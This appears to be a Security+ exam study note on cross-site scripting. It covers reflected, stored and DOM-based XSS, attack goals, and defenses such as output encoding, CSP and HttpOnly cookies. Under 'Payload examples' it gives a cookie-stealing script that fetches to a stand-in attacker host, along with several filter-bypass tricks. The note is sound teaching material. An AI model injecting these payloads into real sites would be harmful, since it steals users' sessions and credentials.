# Cross-site Scripting

## What it is

In Dark Souls, an invader drops a poisoned message on the ground — "try jumping" — right next to a bottomless pit. You read it, your client (your character) executes the suggestion, and you fall to your death. The message wasn't from the game devs; it was injected by another player and rendered to you as if it were trustworthy. That's exactly what Cross-site Scripting does — an attacker plants malicious script in a trusted website, and the victim's browser executes it as if the site itself sent it.

**Cross-site Scripting (XSS)** is a client-side injection vulnerability in which an attacker inserts malicious script (typically JavaScript) into web content that a victim's browser then renders and executes within the trust context of the legitimate site.

## Why it matters

XSS hijacks sessions, steals cookies, performs actions as the user, defaces pages, and pivots into keylogging or credential phishing — all under the victim's authenticated session and the site's domain trust. For SY0-701, Objective 2.3 lists XSS explicitly under "application attacks," and 2.5 covers the defenses ([[input validation]], [[output encoding]], [[Content Security Policy]]). The classic CompTIA trap: confusing **XSS** (victim's browser executes attacker's script via a trusted site) with [[CSRF]] (victim's browser is tricked into submitting a forged authenticated request). XSS = code execution in the client. CSRF = unwanted action via the client. Know the difference cold.

## Key facts

### The three flavors of XSS

| Type | Where the payload lives | Trigger | Example |
|---|---|---|---|
| **[[Reflected XSS]]** (non-persistent) | In a crafted URL or request parameter | Victim clicks a malicious link | `search.php?q=<script>...</script>` |
| **[[Stored XSS]]** (persistent) | Saved in the server (DB, comment, profile) | Any user views the affected page | Malicious script in a forum post |
| **[[DOM-based XSS]]** | Entirely client-side; never touches server | Vulnerable JavaScript writes attacker input to DOM | `document.write(location.hash)` |

Stored is the worst — one injection, many victims, no clicking required. DOM-based is the sneakiest — server logs see nothing.

### Attack mechanics

- **Vector**: any input rendered back to a browser without proper handling — URL parameters, form fields, HTTP headers, file uploads, comments.
- **Payload examples**: `<script>fetch('//attacker/'+document.cookie)</script>`, `<img src=x onerror=...>`, `<svg onload=...>`.
- **Goals**: [[session hijacking]] via cookie theft, [[credential harvesting]] via fake login forms, [[keylogging]], [[clickjacking]] assistance, [[browser exploitation framework|BeEF]] hooking, [[CSRF]] token theft to chain attacks.
- **Bypass tricks**: encoding (`&#x3C;script&#x3E;`), event handlers instead of `<script>`, polyglot payloads, mutation XSS against naive sanitizers.

### Defenses (know these for the exam)

| Defense | What it does |
|---|---|
| **[[Input validation]]** | Reject or constrain input on allow-list (length, type, format) |
| **[[Output encoding]]** | Context-aware escaping — HTML entity, JS string, URL, CSS — at the point of rendering |
| **[[Content Security Policy]] (CSP)** | HTTP header restricting which script sources the browser will execute |
| **[[HttpOnly]] cookie flag** | Prevents JavaScript from reading session cookies via `document.cookie` |
| **[[Secure cookie]] flag** | Cookie only sent over TLS |
| **[[SameSite]] cookie attribute** | Limits cross-origin sending; mitigates chained CSRF |
| **[[WAF|Web Application Firewall]]** | Pattern-based filtering of known XSS payloads (defense in depth, not primary) |
| **Framework auto-escaping** | Modern frameworks (React, Angular) escape by default — don't override it |

### Exam-precise distinctions

- **XSS vs. [[SQL Injection]]**: XSS executes in the *victim's browser*; SQLi executes in the *server's database*.
- **XSS vs. [[CSRF]]**: XSS runs attacker-controlled code; CSRF rides the user's authenticated session to perform a single action. XSS can defeat CSRF tokens; CSRF cannot do XSS.
- **Same-Origin Policy (SOP)** doesn't stop XSS — the script *is* same-origin because it's served by the trusted site. That's the whole point of the attack.

## Related concepts

[[SQL Injection]] · [[CSRF]] · [[Input validation]] · [[Output encoding]] · [[Content Security Policy]] · [[Session hijacking]] · [[Same-Origin Policy]] · [[HttpOnly]] · [[WAF]] · [[OWASP Top 10]] · [[DOM]] · [[Injection attacks]]

---
*Source: VIRGIL knowledge base — 2026-05-08*